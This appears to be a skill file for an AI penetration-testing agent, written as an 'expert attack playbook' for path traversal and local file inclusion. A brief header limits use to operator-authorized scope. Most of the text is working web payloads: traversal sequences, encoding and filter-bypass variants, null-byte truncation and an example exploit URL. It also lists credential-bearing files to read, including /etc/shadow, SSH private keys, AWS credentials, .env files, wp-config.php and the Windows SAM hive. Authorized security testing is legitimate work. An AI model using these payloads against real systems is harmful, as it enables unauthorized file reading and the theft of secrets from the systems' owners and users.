# SKILL: Path Traversal / Local File Inclusion (LFI) — Expert Attack Playbook

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=active`, `default=enabled`. Trusted `policy.json` remains authoritative.

- Restrict activity to the exact TaskSpec scope. Use only bounded registry actions accepted by execution policy; exploitation work is limited to the operator's authorized, evidence-recorded scope.
- Preserve baseline and test ToolResults as Evidence, including errors and negative observations, before drawing a conclusion.
- Treat command examples as reference syntax; actual execution goes through the bounded shell_exec tool when the operator has authorized it.
- Complete only after every success criterion is assessed from cited evidence.

> **Technical reference scope**: Expert path traversal and LFI techniques. Covers encoding bypass sequences, OS differences, filter bypass, PHP wrapper exploitation, log poisoning to RCE, and the critical distinction between path traversal (read only) vs LFI (execution). Pay particular attention to encoding chains and RCE escalation paths.

## 0. RELATED ROUTING

Before deeper analysis, consider these catalog routes:
- `upload-insecure-files` when the primary attack surface is an upload workflow rather than an include or read primitive

### First-pass traversal chains

```text
../etc/passwd
../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
..\\..\\..\\windows\\win.ini
```

## 1. CORE CONCEPT

**Path Traversal**: Read arbitrary files by escaping the intended directory with `../` sequences.
**LFI**: In PHP, when user input controls `include()`/`require()` — file is **executed** as PHP code, not just read.

```
http://target.com/index.php?page=home
→ Opens: /var/www/html/pages/home.php

Traversal attack:
http://target.com/index.php?page=../../../../etc/passwd
→ Opens: /etc/passwd
```

---

## 2. TRAVERSAL SEQUENCE VARIANTS

The filtering strategy determines which encoding to use:

### Basic
```
../../../etc/passwd
..\..\..\windows\system32\drivers\etc\hosts  (Windows)
```

### URL Encoding
```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd     ← %2f = '/'
%2e%2e%5c%2e%2e%5c%2e%2e%5c                  ← %5c = '\'
```

### Double URL Encoding (when server decodes once, filter checks before decode)
```
%252e%252e%252f%252e%252e%252f  ← %25 = %, double-encoded %2e
..%252f..%252fetc%252fpasswd
```

### Unicode / Overlong UTF-8
```
..%c0%af..%c0%af     ← overlong UTF-8 encoding of '/'
..%c1%9c..%c1%9c     ← overlong UTF-8 encoding of '\'
..%ef%bc%8f          ← fullwidth solidus '／'
```

### Mixed Encodings
```
..%2F..%2Fetc%2Fpasswd
....//....//etc/passwd   ← double-dot with slash (filter strips single ../)
```

### Filter Strips `../` (so `../` becomes `../` after strip)
```
....//          ← becomes ../ after filter strips ../
..././          ← becomes ../ after filter strips ./
```

### Null Byte Injection (legacy PHP < 5.3.4)
```
../../../../etc/passwd%00.jpg   ← %00 truncates string, strips .jpg extension
../../../../etc/passwd%00.php
```

## 3. TARGET FILES AND ESCALATION TARGETS

### Linux
```
/etc/passwd                  ← user list (usernames, UIDs)
/etc/shadow                  ← password hashes (requires root-level file read)
/etc/hosts                   ← internal hostnames → pivot targets
/etc/hostname                ← server hostname
/proc/self/environ           ← process environment (DB creds, API keys!)
/proc/self/cmdline           ← process command line
/proc/self/fd/0              ← stdin file descriptor
/proc/[pid]/maps             ← memory maps (loaded libraries with paths)
/var/log/apache2/access.log  ← for log poisoning
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log            ← SSH attempt log
/var/mail/www-data            ← email for www-data user
/home/USER/.ssh/id_rsa       ← SSH private key
/home/USER/.ssh/authorized_keys
/home/USER/.bash_history     ← command history (credentials!)
/home/USER/.aws/credentials  ← AWS keys
/tmp/sess_SESSIONID          ← PHP session files (if session.save_path=/tmp)
```

### Web Application Config Files
```
/var/www/html/.env           ← Laravel/Node.js env vars
/var/www/html/config.php     ← PHP config
/var/www/html/wp-config.php  ← WordPress DB credentials
/etc/apache2/sites-enabled/  ← Apache vhosts
/etc/nginx/sites-enabled/    ← Nginx config
/usr/local/etc/nginx/nginx.conf
```

### Windows
```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System32\config\SAM          ← NTLM hashes (often locked)
C:\inetpub\wwwroot\web.config           ← ASP.NET DB connection strings
C:\inetpub\wwwroot\global.asa
C:\xampp\htdocs\wp-config.php
C:\Users\Administrator\.ssh\id_rsa
C:\ProgramData\MySQL\MySQL Server 8\my.ini  ← MySQL config
```
